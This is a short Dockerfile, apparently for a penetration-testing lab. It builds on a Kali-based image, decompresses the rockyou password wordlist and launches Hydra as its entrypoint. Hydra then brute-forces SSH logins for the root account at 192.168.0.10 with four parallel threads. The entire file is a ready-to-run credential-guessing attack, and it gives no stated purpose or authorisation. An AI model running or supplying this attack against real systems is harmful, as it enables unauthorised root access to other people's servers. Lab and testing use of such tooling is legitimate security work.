FROM c4nc/kalibase:latest

RUN gunzip /usr/share/wordlists/rockyou.txt.gz

ENTRYPOINT ["hydra", "-l", "root", "-P", "/usr/share/wordlists/rockyou.txt", "192.168.0.10", "-t", "4", "ssh"]

